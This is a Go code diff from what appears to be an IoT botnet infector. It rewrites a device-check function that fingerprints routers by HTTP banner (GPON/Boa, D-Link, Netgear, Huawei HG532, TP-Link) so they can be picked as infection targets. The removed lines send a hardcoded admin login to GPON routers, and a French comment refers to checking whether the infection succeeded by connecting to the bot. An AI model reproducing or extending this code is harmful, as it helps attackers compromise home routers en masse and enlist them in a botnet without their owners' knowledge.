@@ -617,37 +617,37 @@ func sendLogin(target string) int {
 }
 
 func checkDevice(target string, timeout time.Duration) int {
-
-	var isGpon int = 0
-
-	conn, err := net.DialTimeout("tcp", target, timeout * time.Second)
-    if err != nil {
+	conn, err := net.DialTimeout("tcp", target, timeout*time.Second)
+	if err != nil {
 		return -1
-    }
-    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
-    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=admin&psd=Feefifofum\r\n\r\n"))
+	}
+	defer conn.Close()
+
+	// Tenter de lire la bannière HTTP pour identifier l'appareil
+	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
+	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n", target)
+
+	bytebuf := make([]byte, 1024)
 	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
-
-	bytebuf := make([]byte, 512)
-	l, err := conn.Read(bytebuf)
-	if err != nil || l <= 0 {
-		conn.Close()
-	    return -1
+	n, err := conn.Read(bytebuf)
+	if err != nil || n <= 0 {
+		return 1 // On tente quand même si on ne peut pas lire
 	}
 
-	if strings.Contains(string(bytebuf), "Server: Boa/0.93.15") {
-		// Ne pas incrémenter statusFound ici, c'est fait dans processTarget
-		isGpon = 1
+	banner := string(bytebuf[:n])
+	if strings.Contains(banner, "Boa/0.93.15") || strings.Contains(banner, "GPON") {
+		return 1 // GPON / Boa
+	} else if strings.Contains(banner, "D-Link") || strings.Contains(banner, "DIR-") {
+		return 2 // D-Link
+	} else if strings.Contains(banner, "Netgear") || strings.Contains(banner, "WNR") {
+		return 3 // Netgear
+	} else if strings.Contains(banner, "Huawei") || strings.Contains(banner, "HG532") {
+		return 4 // Huawei
+	} else if strings.Contains(banner, "TP-LINK") {
+		return 5 // TP-Link
 	}
-	zeroByte(bytebuf)
 
-	if isGpon == 0 {
-		conn.Close()
-		return -1
-	}
-
-	conn.Close()
-	return 1
+	return 1 // Par défaut
 }
 
 // Vérifier si l'infection a réussi en tentant de se connecter au bot
